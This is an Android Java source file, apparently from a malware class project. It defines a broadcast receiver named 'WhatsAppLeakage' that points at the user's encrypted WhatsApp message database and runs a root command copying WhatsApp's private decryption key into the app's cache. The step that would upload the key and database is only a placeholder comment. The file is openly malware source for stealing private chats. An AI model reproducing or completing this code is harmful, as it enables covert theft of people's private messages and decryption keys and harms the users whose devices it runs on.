package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import java.io.File;
import java.util.ArrayList;

public class WhatsAppLeakage extends BroadcastReceiver {

    private static final String TAG = "WHATSAPP";
    private static String cacheDirPath = null;

    @Override
    public void onReceive(Context context, Intent intent) {
        File file = new File("/sdcard/WhatsApp/Databases/msgstore.db.crypt12");
        cacheDirPath = context.getCacheDir().getAbsolutePath();
        new ExportCryptKey();
        File key = new File(context.getCacheDir(), "key.txt");

        // upload key and database

    }

    private class ExportCryptKey extends ExecuteAsRootBase{

        @Override
        protected ArrayList<String> getCommandsToExecute() {
            ArrayList<String> commands = new ArrayList<>();
            String command = "cp /data/data/com.whatsapp/files/key " + cacheDirPath + "/key.txt";
            commands.add(command);
            return commands;
        }
    }
}
